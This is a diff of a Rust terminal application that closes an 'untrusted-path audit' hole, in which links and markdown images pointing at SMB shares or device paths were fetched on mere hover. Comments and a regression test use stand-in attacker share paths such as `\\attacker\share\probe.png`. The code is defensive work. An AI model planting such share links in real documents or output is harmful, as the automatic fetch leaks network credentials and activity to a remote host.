@@ -1107,6 +1107,22 @@ struct VideoGlance {
 /// no source for still has a size, and the card that says only its size is the honest one rather
 /// than the refusal it replaced.
 fn read_video_glance(path: &Path) -> VideoGlance {
+    // **Media Foundation opens what it is given** (route A of the untrusted-path audit,
+    // 2026-09-08). `first_frame` hands the path to `IMFSourceReader`, which is a full container
+    // parse of a file this window never checked was one of its own; a `.mp4` on a share was
+    // therefore fetched over SMB by a resting pointer, and the `metadata` on the line below dialled
+    // the same server first. The disk's half of the question is asked too, because this runs on the
+    // worker and the bytes are about to be read.
+    if !bt_transcript::paths::may_read_unasked_through_links(
+        path,
+        bt_transcript::paths::PathNamer::ThisWindow,
+    ) {
+        return VideoGlance {
+            frame: None,
+            facts: preview::VideoFacts::default(),
+            mtime: None,
+        };
+    }
     let metadata = std::fs::metadata(path).ok();
     let bytes = metadata.as_ref().map(std::fs::Metadata::len);
     let mtime = metadata.and_then(|meta| meta.modified().ok());
@@ -1793,6 +1809,12 @@ fn resolve_document_pictures(
         let picture = match resolved {
             preview::LinkAction::Web(url) => MarkdownPicture::Remote(url),
             preview::LinkAction::Nowhere => MarkdownPicture::Nowhere,
+            // **A source this window will not go looking at** (route E of the untrusted-path
+            // audit, 2026-09-08). `![](\\attacker\share\x.png)` inside a document rendered on a
+            // hover used to reach `ask` — which is `request_peek_pixels` — and the picture was
+            // fetched over SMB with no click anywhere. It draws what a picture this window cannot
+            // read draws, because that is what it is: the file is not this window's to open.
+            preview::LinkAction::Refused(_) => MarkdownPicture::Failed,
             preview::LinkAction::Preview(path) => {
                 let picture = ask(&path, image.fill);
                 pictures.files.insert(path);
@@ -7187,13 +7209,22 @@ fn peek_body_kind(
         return PeekBodyKind::Gone;
     }
     match (ftype, path) {
-        (preview::PreviewFtype::Image, Some(_)) => PeekBodyKind::Picture,
+        // **A refusal outranks a picture, and used to be read after one** (route A of the
+        // untrusted-path audit, 2026-09-08). This arm and the video arm below it match on the
+        // *name's* judgement and on there being a file, and both are true of
+        // `\\attacker\share\probe.png`: the buffer had already filed `Refused(NetworkPath)`, and
+        // this ladder walked past it into a body whose whole job is to ask the decoration worker
+        // for that file's pixels. The refusal was drawn one layer above a read that had already
+        // gone out to the share. Every other arm consults `refused` — the page arm below, the
+        // fall-through at the end — so the guard is this ladder's own rule reaching the two rungs
+        // that were written before there was anything for them to refuse.
+        (preview::PreviewFtype::Image, Some(_)) if !refused => PeekBodyKind::Picture,
         // **A video, and the same two-part shape the picture arm has**: a body
         // that needs a file has one, and a composed document that merely spells
         // a video's name — a git diff of `clip.mp4` is a reading of a repository
         // — has nothing to decode and falls to the refusal, exactly as a
         // composed `.png` does one line up.
-        (preview::PreviewFtype::Video, Some(_)) => PeekBodyKind::Frame,
+        (preview::PreviewFtype::Video, Some(_)) if !refused => PeekBodyKind::Frame,
         (
             preview::PreviewFtype::Image
             | preview::PreviewFtype::Video
@@ -7284,6 +7315,65 @@ mod peek_gone_tests {
             peek_body_kind(PreviewFtype::Unknown, None, true, true),
             PeekBodyKind::Refused,
             "a reading with no file on disk cannot be gone",
+        );
+    }
+
+    /// RED — **a refusal is a refusal for a picture too** (route A of the untrusted-path audit,
+    /// 2026-09-08).
+    ///
+    /// RED EVIDENCE (2026-09-08). A child process prints an `OSC 8` link whose target is
+    /// `file://attacker/share/probe.png`; a pointer rests on the label. The preview buffer records
+    /// `Refused(NetworkPath)` exactly as §7.1.3 says it must — and then this ladder matched
+    /// `(Image, Some(_))` before it read `refused` at all, so the card chose a picture body, and a
+    /// picture body asks the decoration worker for that file's pixels. The refusal was drawn one
+    /// layer above a read that had already gone out to the share. Before the fix:
+    ///
+    /// ```text
+    /// a refused Image asks for no pixels
+    ///   left: Picture  right: Refused
+    /// a refused Video asks for no pixels
+    ///   left: Frame  right: Refused
+    /// ```
+    ///
+    /// [`PeekBodyKind::Picture`] and [`PeekBodyKind::Frame`] are the only two bodies that reach
+    /// `WindowRuntime::request_peek_pixels`, so "never requests pixels" is exactly "is neither of
+    /// those two" — which is what the assertion below says, in the terms this ladder answers in.
+    ///
+    /// MUTATION: drop the `!refused` guard from either arm and that arm's file is read again.
+    #[test]
+    fn a_refused_picture_or_recording_asks_for_no_pixels() {
+        use preview::PreviewFtype;
+        let path = Path::new(r"\\attacker\share\probe.png");
+
+        for (ftype, name) in [
+            (PreviewFtype::Image, "Image"),
+            (PreviewFtype::Video, "Video"),
+        ] {
+            assert_eq!(
+                peek_body_kind(ftype, Some(path), true, false),
+                PeekBodyKind::Refused,
+                "a refused {name} asks for no pixels",
+            );
+        }
+
+        // And the ordinary local file is untouched: a picture nobody refused is still a picture.
+        assert_eq!(
+            peek_body_kind(
+                PreviewFtype::Image,
+                Some(Path::new(r"C:\shots\a.png")),
+                false,
+                false
+            ),
+            PeekBodyKind::Picture,
+        );
+        assert_eq!(
+            peek_body_kind(
+                PreviewFtype::Video,
+                Some(Path::new(r"C:\shots\a.mp4")),
+                false,
+                false
+            ),
+            PeekBodyKind::Frame,
         );
     }
 }
@@ -17040,8 +17130,12 @@ enum ControlClickHint {
 }
 
 impl ControlClickHint {
-    fn of(uri: &str, is_directory: &dyn Fn(&Path) -> bool) -> Option<Self> {
-        match hyperlink_activation(true, true, uri, is_directory) {
+    fn of(
+        uri: &str,
+        namer: bt_transcript::paths::PathNamer<'_>,
+        is_directory: &dyn Fn(&Path) -> bool,
+    ) -> Option<Self> {
+        match hyperlink_activation(true, true, uri, namer, is_directory) {
             HyperlinkActivation::External(_) | HyperlinkActivation::Browser => {
                 Some(Self::DefaultApp)
             }
@@ -17130,7 +17224,12 @@ impl HyperlinkHover {
     /// standing division: the answer is a fact about the disk and this type
     /// holds none. It is asked here and nowhere else, which is what keeps one
     /// filesystem question off the frame clock.
-    fn activate_if_due(&mut self, now: Instant, is_directory: &dyn Fn(&Path) -> bool) -> bool {
+    fn activate_if_due(
+        &mut self,
+        now: Instant,
+        namer: bt_transcript::paths::PathNamer<'_>,
+        is_directory: &dyn Fn(&Path) -> bool,
+    ) -> bool {
         if self.show_at.is_none_or(|deadline| now < deadline) {
             return false;
         }
@@ -17140,7 +17239,7 @@ impl HyperlinkHover {
         self.hands_on = self
             .active
             .as_ref()
-            .and_then(|hit| ControlClickHint::of(&hit.uri, is_directory));
+            .and_then(|hit| ControlClickHint::of(&hit.uri, namer, is_directory));
         self.active.is_some()
     }
 
@@ -19048,7 +19147,14 @@ fn preview_link_activation(control: bool, target: &str, document: &Path) -> Prev
                 WebAddressActivation::Blocked => PreviewLinkActivation::Blocked(url),
             }
         }
-        preview::LinkAction::Nowhere => PreviewLinkActivation::None,
+        // **A target this window may not read is not a link** (route E of the untrusted-path
+        // audit, 2026-09-08). The same answer `Nowhere` gets, and for a reason a reader can feel:
+        // the row wears no finger, and a press on it does nothing — because what it names is a
+        // share, a device, or a distribution nobody in this window is standing in, and this window
+        // does not go there off a document somebody else wrote.
+        preview::LinkAction::Refused(_) | preview::LinkAction::Nowhere => {
+            PreviewLinkActivation::None
+        }
     }
 }
 
@@ -19105,9 +19211,10 @@ fn preview_link_answers_a_press(control: bool, target: &str, document: &Path) ->
 /// a folder may be named `site.html`, and Explorer's arm was settled a slice
 /// before the page arm existed.
 ///
-/// It is deliberately **not** asked of a share. `preview::is_network_path` is
-/// answered from the path's own prefix, and the answer for a share is settled
-/// before any question could be put to the network: §7.1.3 does not read one
+/// It is deliberately **not** asked of a share, nor of anything else this
+/// window may not read unasked. `bt_transcript::paths::may_read_unasked` is
+/// answered from the path's own spelling and this pane's own namespace, and the
+/// answer for a share is settled before any question could be put to the network: §7.1.3 does not read one
 /// unasked, the preview seat has a card that says so, and probing whether a cold
 /// `\\server` is a directory would stall the event loop to reach a conclusion
 /// that was already reached.
@@ -19115,6 +19222,7 @@ fn hyperlink_activation(
     control: bool,
     click_no_drag: bool,
     uri: &str,
+    namer: bt_transcript::paths::PathNamer<'_>,
     is_directory: &dyn Fn(&Path) -> bool,
 ) -> HyperlinkActivation {
     if !click_no_drag {
@@ -19161,7 +19269,15 @@ fn hyperlink_activation(
         // synchronous on this thread, so handing a cold `\\server` to the shell
         // would stall the window for exactly the network round trip the arm above
         // refuses to make.
-        if preview::is_network_path(&path) {
+        //
+        // **And the question is the pane's** (route D of the untrusted-path audit, 2026-09-08).
+        // The prefix test that stood here admitted a device path, a verbatim path and every
+        // distribution's share, whichever pane the link was printed in — so `file://./pipe/name`
+        // and `file://wsl.localhost/Stopped/x` both walked past it into `is_directory`, which is a
+        // filesystem call on the thread that paints. The predicate below refuses all three before
+        // any syscall, and it refuses a distribution's share unless *this* pane is the one standing
+        // in that distribution, which is the only way this window ever mints one.
+        if !bt_transcript::paths::may_read_unasked(&path, namer) {
             return HyperlinkActivation::Preview(path, at);
         }
         // The folder question first: a directory may be named `site.html`, and
@@ -19229,6 +19345,22 @@ struct TerminalReference {
     rect: [f32; 4],
 }
 
+/// **Whether a link target is a folder, asked only where it may be asked** (route D of the
+/// untrusted-path audit, 2026-09-08).
+///
+/// `Path::is_dir` is a filesystem call, and every caller of it in the routing table is on the
+/// thread that paints: a target on a disconnected share stops the window for the operating
+/// system's own timeout, and a target in the device namespace stops it for as long as whoever is
+/// on the other end likes. So the question is put to the name first, through the one predicate,
+/// and the disk is asked only about a name this window would read anyway.
+///
+/// The link hop is included and costs nothing off the machine: `symlink_metadata` and `read_link`
+/// are asked of the link itself, never of what it points at, so a junction into `\\server\share`
+/// is refused for what is written inside it rather than by going there.
+fn path_is_a_directory_unasked(path: &Path, namer: bt_transcript::paths::PathNamer<'_>) -> bool {
+    bt_transcript::paths::may_read_unasked_through_links(path, namer) && path.is_dir()
+}
+
 /// [`ReferenceCard`] for the target `uri`, or `None` for a reference this window
 /// has no card for.
 ///
@@ -19266,8 +19398,12 @@ struct TerminalReference {
 /// `control` is deliberately not a parameter. A modifier held during a hover is
 /// not a request; the card is what this window has to say about the reference,
 /// and `Ctrl` changes where a *press* goes rather than what the thing is.
-fn reference_card(uri: &str, is_directory: &dyn Fn(&Path) -> bool) -> Option<ReferenceCard> {
-    match hyperlink_activation(false, true, uri, is_directory) {
+fn reference_card(
+    uri: &str,
+    namer: bt_transcript::paths::PathNamer<'_>,
+    is_directory: &dyn Fn(&Path) -> bool,
+) -> Option<ReferenceCard> {
+    match hyperlink_activation(false, true, uri, namer, is_directory) {
         HyperlinkActivation::Preview(path, _) => Some(ReferenceCard::File(path)),
         HyperlinkActivation::FilesColumn(path) => Some(ReferenceCard::Folder(path)),
         HyperlinkActivation::None
@@ -24107,10 +24243,11 @@ fn pointer_cursor(
 fn terminal_link_answers_a_press(
     control: bool,
     uri: Option<&str>,
+    namer: bt_transcript::paths::PathNamer<'_>,
     is_directory: &dyn Fn(&Path) -> bool,
 ) -> bool {
     uri.is_some_and(|uri| {
-        hyperlink_activation(control, true, uri, is_directory) != HyperlinkActivation::None
+        hyperlink_activation(control, true, uri, namer, is_directory) != HyperlinkActivation::None
     })
 }
 
@@ -55711,6 +55848,15 @@ impl Runtime<'_> {
     /// Answers whether the question went out. `false` is a worker that has stopped or a channel
     /// that has closed, which each caller turns into its own kind of silence.
     fn request_peek_pixels(&self, path: &Path) -> bool {
+        // **The door itself asks whether this is a file to read** (routes A and E of the
+        // untrusted-path audit, 2026-09-08). Three surfaces reach this line — the preview pane,
+        // the glance card and a markdown page's own pictures — and each of them used to decide
+        // locality for itself or not at all, so a share reached the decoder through whichever of
+        // the three had not asked. One door, one question: what goes out of here is a request to
+        // open a file, and a request nobody may make is one this window does not send.
+        if !preview::is_readable_unasked(path) {
+            return false;
+        }
         if !self.app.math_worker_running {
             return false;
         }
@@ -60570,7 +60716,11 @@ impl Runtime<'_> {
         let columns = frame.columns.get();
         let (row, column) = (cell / columns, cell % columns);
         let hyperlink = frame.hyperlink_at(row, column)?;
-        let card = reference_card(&hyperlink.uri, &|path| path.is_dir())?;
+        let namespace = self.seat_path_namespace(seat);
+        let namer = bt_transcript::paths::PathNamer::Pane(&namespace);
+        let card = reference_card(&hyperlink.uri, namer, &|path| {
+            path_is_a_directory_unasked(path, namer)
+        })?;
         let cells = frame.hyperlink_cells(&hyperlink);
         // **Identity is the run's first cell and the target together.** The
         // target alone would make one path printed twice one reference, so a
@@ -61484,10 +61634,23 @@ impl Runtime<'_> {
         // drawn, rather than a worker hop later under a resting pointer. It is
         // one author for one number: the worker's page read stopped carrying a
         // byte count on the same day ([`preview::PreviewWant::PageCount`]).
+        //
+        // **And the filter is the one predicate, links included** (route D of the untrusted-path
+        // audit, 2026-09-08). A prefix test admits `C:\…\reachable` whose junction points at a
+        // share, and this `metadata` follows a link before it answers — once per frame, on the
+        // thread that paints. Both halves of the question are asked here rather than only the
+        // lexical one because both are local calls: `symlink_metadata` and `read_link` are asked of
+        // the link and never of what it points at, so this stays the same handful of microseconds
+        // §7.29 already spends here.
         let stat = subject
             .path
             .as_deref()
-            .filter(|path| !preview::is_network_path(path))
+            .filter(|path| {
+                bt_transcript::paths::may_read_unasked_through_links(
+                    path,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                )
+            })
             .map(std::fs::metadata);
         let gone = matches!(stat, Some(Err(_)));
         let bytes = stat.and_then(Result::ok).map(|file| file.len());
@@ -74509,6 +74672,33 @@ impl Runtime<'_> {
         self.sessions.get(&seat)?.last_presented_frame.as_ref()
     }
 
+    /// **Which spelling of an absolute path the shell in `seat` prints** — the pane's namespace,
+    /// read from the session that was told it at spawn.
+    ///
+    /// It is what [`bt_transcript::paths::PathNamer::Pane`] carries, and therefore what decides
+    /// whether a `\\wsl.localhost\<distro>\…` target printed into *this* pane names a place this
+    /// window may read (route D of the untrusted-path audit, 2026-09-08). A seat with no session
+    /// behind it — a folder tab, a file tab — prints nothing at all, and `Windows` is the honest
+    /// answer for a pane that has no shell to speak another namespace.
+    fn seat_path_namespace(&self, seat: SeatId) -> bt_transcript::paths::PrintedPathNamespace {
+        self.sessions
+            .get(&seat)
+            .map(|leaf| leaf.session.printed_path_namespace())
+            .unwrap_or_default()
+    }
+
+    /// [`Self::seat_path_namespace`] for the pane the pointer is standing in.
+    ///
+    /// The hover's own pane and not the focused one, because a hyperlink hover belongs to whatever
+    /// pane the pointer is over ([`Self::hover_pane`]'s whole reason for existing), and the link
+    /// under it was printed by *that* pane's shell.
+    fn hovered_pane_path_namespace(&self) -> bt_transcript::paths::PrintedPathNamespace {
+        self.window
+            .hover_pane
+            .map(|seat| self.seat_path_namespace(seat))
+            .unwrap_or_default()
+    }
+
     /// The cell a selection drag that began in `seat` is over, with the pointer
     /// clamped into that pane's own body.
     ///
@@ -75268,10 +75458,12 @@ impl Runtime<'_> {
         // same question [`Self::activate_hyperlink`] asks on the press, so the
         // sentence the reader is shown and the door the press opens are one
         // answer read twice.
+        let namespace = self.hovered_pane_path_namespace();
+        let namer = bt_transcript::paths::PathNamer::Pane(&namespace);
         if self
             .window
             .hyperlink_hover
-            .activate_if_due(now, &|path| path.is_dir())
+            .activate_if_due(now, namer, &|path| path_is_a_directory_unasked(path, namer))
         {
             self.repaint_hovered_pane()?;
         }
@@ -75376,8 +75568,17 @@ impl Runtime<'_> {
     /// established that the release came up on the cell the press went down on.
     /// It stays in the signature so the table can be tested with it false, which
     /// is what pins "a drag is only ever a selection".
-    fn activate_hyperlink(&mut self, hyperlink: HyperlinkHit, control: bool) -> Result<()> {
-        let activation = hyperlink_activation(control, true, &hyperlink.uri, &|path| path.is_dir());
+    fn activate_hyperlink(
+        &mut self,
+        seat: SeatId,
+        hyperlink: HyperlinkHit,
+        control: bool,
+    ) -> Result<()> {
+        let namespace = self.seat_path_namespace(seat);
+        let namer = bt_transcript::paths::PathNamer::Pane(&namespace);
+        let activation = hyperlink_activation(control, true, &hyperlink.uri, namer, &|path| {
+            path_is_a_directory_unasked(path, namer)
+        });
         // Which arm of the routing table this address fell into, the address it
         // fell there with, and — for a `file:` — what the address actually named
         // on this disk (`BT_MOUSE_TRACE`).
@@ -75397,8 +75598,8 @@ impl Runtime<'_> {
             let named = bt_platform::file_uri_to_path(&hyperlink.uri).map_or_else(
                 || "path=unparsed".to_owned(),
                 |path| {
-                    if preview::is_network_path(&path) {
-                        format!("path={} share=1", path.display())
+                    if !bt_transcript::paths::may_read_unasked_through_links(&path, namer) {
+                        format!("path={} refused=1", path.display())
                     } else {
                         format!(
                             "path={} exists={} dir={}",
@@ -77274,13 +77475,16 @@ impl Runtime<'_> {
     /// so the shape and the mark cannot come to disagree about which cells are a
     /// link, nor the shape and the verb about what that link would do.
     fn terminal_link_grasp(&self) -> bool {
+        let namespace = self.hovered_pane_path_namespace();
+        let namer = bt_transcript::paths::PathNamer::Pane(&namespace);
         terminal_link_answers_a_press(
             self.window.modifiers.control_key(),
             self.window
                 .hyperlink_hover
                 .underline_target()
                 .map(|hyperlink| hyperlink.uri.as_str()),
-            &|path| path.is_dir(),
+            namer,
+            &|path| path_is_a_directory_unasked(path, namer),
         )
     }
 
@@ -81964,7 +82168,7 @@ impl Runtime<'_> {
             self.copy_selection_on_release(seat);
         }
         if let Some(hyperlink) = hyperlink_to_open {
-            self.activate_hyperlink(hyperlink, hyperlink_control)?;
+            self.activate_hyperlink(seat, hyperlink, hyperlink_control)?;
         }
         if let Some(activation) = local_image_action {
             match activation {
@@ -101910,7 +102114,11 @@ mod tests {
         // URI and an OSC 8 target into the same link, so one case covers all
         // three by construction.
         assert_eq!(
-            reference_card("file:///C:/Developer/notes.md", &file),
+            reference_card(
+                "file:///C:/Developer/notes.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &file
+            ),
             Some(ReferenceCard::File(PathBuf::from(r"C:\Developer\notes.md")))
         );
         // And every class the card has a body for arrives down that same arm —
@@ -101919,7 +102127,10 @@ mod tests {
         for name in ["report.pdf", "page.html", "shot.png", "clip.mp4", "a.bin"] {
             let uri = format!("file:///C:/Developer/{name}");
             assert!(
-                matches!(reference_card(&uri, &file), Some(ReferenceCard::File(_))),
+                matches!(
+                    reference_card(&uri, bt_transcript::paths::PathNamer::ThisWindow, &file),
+                    Some(ReferenceCard::File(_))
+                ),
                 "{name} is a file, and the card decides what to draw of it elsewhere"
             );
         }
@@ -101927,11 +102138,19 @@ mod tests {
         // A folder — including one named like a page, because the directory
         // question is asked before the page question and was settled first.
         assert_eq!(
-            reference_card("file:///C:/Developer/src", &folder),
+            reference_card(
+                "file:///C:/Developer/src",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &folder
+            ),
             Some(ReferenceCard::Folder(PathBuf::from(r"C:\Developer\src")))
         );
         assert!(matches!(
-            reference_card("file:///C:/Developer/site.html", &folder),
+            reference_card(
+                "file:///C:/Developer/site.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &folder
+            ),
             Some(ReferenceCard::Folder(_))
         ));
 
@@ -101940,9 +102159,11 @@ mod tests {
         // column borrows it. The disk is never asked: `is_directory` would stall
         // the loop on a cold server, and the arm above it returns first.
         assert_eq!(
-            reference_card("file://server/share/notes.md", &|_| {
-                panic!("a share is answered without touching the network")
-            }),
+            reference_card(
+                "file://server/share/notes.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|_| { panic!("a share is answered without touching the network") }
+            ),
             Some(ReferenceCard::File(PathBuf::from(
                 r"\\server\share\notes.md"
             )))
@@ -101959,7 +102180,7 @@ mod tests {
             "notascheme",
         ] {
             assert_eq!(
-                reference_card(uri, &file),
+                reference_card(uri, bt_transcript::paths::PathNamer::ThisWindow, &file),
                 None,
                 "{uri} has no destination inside this window, so it has no card"
             );
@@ -108858,11 +109079,23 @@ mod tests {
     #[test]
     fn hyperlink_activation_requires_a_click_without_drag() {
         assert_eq!(
-            hyperlink_activation(true, true, "https://example.test/path", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "https://example.test/path",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Browser
         );
         assert_eq!(
-            hyperlink_activation(true, true, "HTTP://localhost:3000", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "HTTP://localhost:3000",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Browser
         );
         // **A drag never activates anything**, whatever the scheme and whatever
@@ -108878,7 +109111,13 @@ mod tests {
         ] {
             for control in [false, true] {
                 assert_eq!(
-                    hyperlink_activation(control, false, uri, &|_| true),
+                    hyperlink_activation(
+                        control,
+                        false,
+                        uri,
+                        bt_transcript::paths::PathNamer::ThisWindow,
+                        &|_| true
+                    ),
                     HyperlinkActivation::None,
                     "a drag rather than a click: {uri:?}, Ctrl {control}"
                 );
@@ -108905,32 +109144,59 @@ mod tests {
         // pins it.
         for uri in ["mailto:person@example.test", "ftp://files.example.test/pub"] {
             assert_eq!(
-                hyperlink_activation(false, true, uri, &|path| path
-                    == Path::new(r"C:\some\folder")),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &|path| path == Path::new(r"C:\some\folder")
+                ),
                 HyperlinkActivation::None,
                 "a plain click on a target that leaves this window: {uri:?}"
             );
         }
         assert_eq!(
-            hyperlink_activation(false, true, "file:///C:/page.html", &|path| path
-                == Path::new(r"C:\some\folder")),
+            hyperlink_activation(
+                false,
+                true,
+                "file:///C:/page.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|path| path == Path::new(r"C:\some\folder")
+            ),
             HyperlinkActivation::Preview(PathBuf::from(r"C:\page.html"), None),
             "and a page is a destination inside this window now, so it is not on \
              that list"
         );
         assert_eq!(
-            hyperlink_activation(false, true, "file:///C:/some/folder", &|path| path
-                == Path::new(r"C:\some\folder")),
+            hyperlink_activation(
+                false,
+                true,
+                "file:///C:/some/folder",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|path| path == Path::new(r"C:\some\folder")
+            ),
             HyperlinkActivation::FilesColumn(PathBuf::from(r"C:\some\folder")),
             "and the folder that left it starts no program either — it opens a column"
         );
         assert_eq!(
-            hyperlink_activation(false, true, "https://example.test/path", &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                "https://example.test/path",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Page("https://example.test/path".to_owned()),
             "and neither does a web address: its plain half is a pane, not a browser"
         );
         assert_eq!(
-            hyperlink_activation(true, true, "https://example.test/path", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "https://example.test/path",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Browser,
             "the browser is still what `Ctrl` — and only `Ctrl` — reaches"
         );
@@ -108980,12 +109246,24 @@ mod tests {
             "HTTPS://EXAMPLE.TEST/Path?q=1#frag",
         ] {
             assert_eq!(
-                hyperlink_activation(false, true, uri, &no_directories),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Page(uri.to_owned()),
                 "a plain click on {uri:?} opens it in this window"
             );
             assert_eq!(
-                hyperlink_activation(true, true, uri, &no_directories),
+                hyperlink_activation(
+                    true,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Browser,
                 "and Ctrl still hands {uri:?} to the system"
             );
@@ -108993,7 +109271,12 @@ mod tests {
             // now — the half of 7.1.5f's complaint that was still true of this
             // row: an underline that answered a hover and not a press.
             assert!(
-                terminal_link_answers_a_press(false, Some(uri), &no_directories),
+                terminal_link_answers_a_press(
+                    false,
+                    Some(uri),
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 "and the hand is on {uri:?} without a modifier"
             );
         }
@@ -109007,9 +109290,13 @@ mod tests {
             "https://claude.ai/code/artifact/04c0a133-319b-4c8e-b988-7965fe063626",
             "http://localhost:5173/index.html",
         ] {
-            let HyperlinkActivation::Page(url) =
-                hyperlink_activation(false, true, uri, &no_directories)
-            else {
+            let HyperlinkActivation::Page(url) = hyperlink_activation(
+                false,
+                true,
+                uri,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories,
+            ) else {
                 panic!("{uri} is a page");
             };
             assert!(
@@ -109021,15 +109308,33 @@ mod tests {
         // silent plainly and blocked under `Ctrl` — this row moved, the table
         // did not.
         assert_eq!(
-            hyperlink_activation(false, false, "https://example.test/x", &no_directories),
+            hyperlink_activation(
+                false,
+                false,
+                "https://example.test/x",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::None
         );
         assert_eq!(
-            hyperlink_activation(false, true, "mailto:person@example.test", &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                "mailto:person@example.test",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::None
         );
         assert_eq!(
-            hyperlink_activation(true, true, "mailto:person@example.test", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "mailto:person@example.test",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Blocked
         );
         // An address this window would refuse is refused under both modifiers,
@@ -109037,11 +109342,23 @@ mod tests {
         // `Ctrl`'s word and the plain half stays silent, exactly as it does for
         // every other row whose text does not parse.
         assert_eq!(
-            hyperlink_activation(false, true, "http:8080/nohost", &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                "http:8080/nohost",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::None
         );
         assert_eq!(
-            hyperlink_activation(true, true, "http:8080/nohost", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "http:8080/nohost",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Blocked
         );
     }
@@ -109094,7 +109411,13 @@ mod tests {
             // than as two lists, because two lists that agree today is exactly
             // what these two were for four months.
             assert_eq!(
-                hyperlink_activation(false, true, uri, &no_directories),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Page(uri.to_owned()),
                 "the terminal says the same about {uri:?}"
             );
@@ -109209,7 +109532,13 @@ mod tests {
         let picture = Path::new(r"C:\shots\img0.jpg");
         for (control, intent) in [(false, ClickIntent::Here), (true, ClickIntent::System)] {
             assert_eq!(ClickIntent::of(control), intent);
-            let link = hyperlink_activation(control, true, "file:///C:/notes/plan.md", &|_| false);
+            let link = hyperlink_activation(
+                control,
+                true,
+                "file:///C:/notes/plan.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|_| false,
+            );
             let reference = local_image_activation(control, true, Some(picture));
             let (link_stays, reference_stays) = (
                 matches!(link, HyperlinkActivation::Preview(_, None)),
@@ -109255,7 +109584,7 @@ mod tests {
     ///    is the reported bug written down;
     /// ② drop the `is_directory` question and a folder opens as a "no preview"
     ///    card instead of in Explorer;
-    /// ③ let the share be probed — swap `is_network_path` for `false` — and the
+    /// ③ let the share be probed — swap the `may_read_unasked` gate for `true` — and the
     ///    UNC cells go red, which is the event loop being handed a cold network
     ///    round trip;
     /// ④ let the plain half answer `Browser`/`Reveal`/`External` and a stray
@@ -109272,18 +109601,30 @@ mod tests {
     ///    *program*, which it must never do, and ⑥ is a plain click doing
     ///    nothing where this window has somewhere to go, which is the same
     ///    half-lie ⑤ is about;
-    /// ⑦ make `preview::is_network_path` answer `true` for a WSL distribution's share again — drop
-    ///    its `is_wsl_distribution_share` clause — and the `wsl.localhost` cells go red: a file
-    ///    inside the distribution meets the network card, which is the refusal 2026-09-07 lifted.
+    /// ⑦ make `may_read_unasked` refuse a WSL distribution's share again — drop its
+    ///    `wsl_share_root_length` arm — and the `wsl.localhost` cells go red: a file inside the
+    ///    distribution meets the network card, which is the refusal 2026-09-07 lifted.
     #[test]
     fn a_click_routes_web_files_pages_folders_shares_and_unknown_schemes() {
         assert_eq!(
-            hyperlink_activation(true, true, "https://example.test/path", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "https://example.test/path",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Browser,
             "a web address under `Ctrl` is the machine's browser"
         );
         assert_eq!(
-            hyperlink_activation(false, true, "https://example.test/path", &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                "https://example.test/path",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Page("https://example.test/path".to_owned()),
             "and plainly it is this window's own seat (2026-08-29): the cell that              read `None` here for as long as nothing in this window drew a page"
         );
@@ -109292,6 +109633,7 @@ mod tests {
                 false,
                 true,
                 "file:///C:/Users/me/phd-application-timeline.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
                 &no_directories
             ),
             HyperlinkActivation::Preview(
@@ -109308,6 +109650,7 @@ mod tests {
                 true,
                 true,
                 "file:///C:/Users/me/phd-application-timeline.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
                 &no_directories
             ),
             HyperlinkActivation::External(PathBuf::from(
@@ -109316,12 +109659,24 @@ mod tests {
             "and Ctrl sends the page to whatever this machine opens pages with"
         );
         assert_eq!(
-            hyperlink_activation(false, true, "file:///C:/Users/me/notes.md", &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                "file:///C:/Users/me/notes.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Preview(PathBuf::from(r"C:\Users\me\notes.md"), None),
             "every other local file goes down the files column's own road"
         );
         assert_eq!(
